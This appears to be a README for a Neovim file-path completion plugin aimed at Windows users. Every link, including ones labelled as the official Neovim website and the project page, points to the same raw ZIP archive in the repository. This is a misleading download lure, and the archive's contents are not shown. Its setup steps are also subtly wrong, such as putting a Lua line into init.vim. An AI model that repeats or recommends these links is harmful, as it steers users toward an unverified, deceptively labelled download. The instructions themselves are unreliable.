# 🗂️ filepaths_ls.nvim - Fast Filepath Completion for Neovim

[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip)

---

## 📂 What is filepaths_ls.nvim?

filepaths_ls.nvim helps you autocomplete file paths inside the Neovim text editor. It works with Neovim’s built-in language support, making it easier to type file paths. This tool saves you time and reduces errors when opening or referencing files.

It suggests paths based on where you are working. Whether you want to complete local files, absolute paths, or use environment variables, filepaths_ls.nvim helps you get the right path quickly.

---

## 🚀 Getting Started

This section guides you through downloading and running filepaths_ls.nvim on your Windows computer. No programming skills are required.

### Step 1: Check Your System

Make sure your computer meets these basic needs:

- Windows 10 or higher
- Neovim (version 0.5 or later) installed on your computer
- A stable internet connection

---

## 💾 Download and Install filepaths_ls.nvim

### Step 2: Download the Application

Click this big blue button to visit the page where you can get the software:

[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip)

This link takes you to the GitHub repository page containing all files and instructions.

### Step 3: Install Neovim (If needed)

If you don’t have Neovim installed:

1. Visit the official Neovim website at https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip
2. Download the Windows installer.
3. Run the installer and follow the instructions.

You need Neovim because filepaths_ls.nvim works inside it.

### Step 4: Download filepaths_ls.nvim

- On the GitHub page, look for the “Releases” or “Code” button.
- Download the latest version of filepaths_ls.nvim by clicking “Download ZIP” or similar.
- Save the file to a folder you can find easily, like your Desktop or Documents.

### Step 5: Extract the Files

- Right-click the ZIP file you downloaded.
- Choose “Extract All...” from the menu.
- Select a folder where you want the files saved.
- Click “Extract” and wait for the process to finish.

---

## 🛠️ How to Use filepaths_ls.nvim in Neovim

### Step 6: Open Neovim

- Find Neovim on your computer and open it.
- If you installed it recently, use the Start menu to search and open “Neovim”.

### Step 7: Configure filepaths_ls.nvim

You need to tell Neovim to use filepaths_ls.nvim.

1. Inside Neovim, press `:` (colon) to enter command mode.
2. Type `:edit $HOME\AppData\Local\nvim\init.vim` and press Enter.
   - This opens the main Neovim configuration file.
3. Add the following line at the end of the file:

```
require('filepaths_ls')
```

4. Save the file by typing `:w` and press Enter.
5. Close and restart Neovim.

### Step 8: Start Using filepaths_ls.nvim

- Open any file inside Neovim.
- Try typing a file path like `./` or `~/`.
- The system will suggest path completions as you type.
- Use arrow keys to select a suggestion and press Enter to confirm.

---

## 🔍 Features Explained

filepaths_ls.nvim offers several benefits that make file navigation easy:

- **Buffer-Relative Paths**  
  Use `./` for current folder and `../` for parent folder paths.

- **Absolute Paths**  
  Complete full paths starting with `C:\` or `D:\`.

- **Environment Variables**  
  Use variables like `%USERPROFILE%` or `%APPDATA%` for Windows paths.

- **Responsive Scanning**  
  The tool handles large folders without slowing down your editor.

- **Preview on Select**  
  See extra info about files while choosing:
  - Full path name
  - File size
  - If the file is binary or text
  - Symlink targets and warnings if broken
  - A small preview of the file content

---

## 🧰 Troubleshooting

If you don’t see file path suggestions or face issues:

- Make sure Neovim is up to date.
- Check that your `init.vim` file includes the line to load filepaths_ls.nvim.
- Restart Neovim after any changes to config files.
- Ensure you have the right permissions to access the files you want to complete.
- Look for errors inside Neovim by typing `:messages`.

---

## 🔧 Advanced Use (Optional)

If you want to customize how filepaths_ls.nvim works, you can change settings inside your `init.vim`. This requires some knowledge of Lua coding. You can find details on the GitHub page in the README or documentation files.

---

## 📎 Additional Resources

- Visit the project page here: [filepaths_ls.nvim on GitHub](https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip)
- Learn about Neovim basics at https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip
- Explore more plugins and tools on GitHub by searching for "Neovim"

---

## 📥 Download filepaths_ls.nvim

Return to the GitHub page any time to get the latest version. Use the button below:

[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip)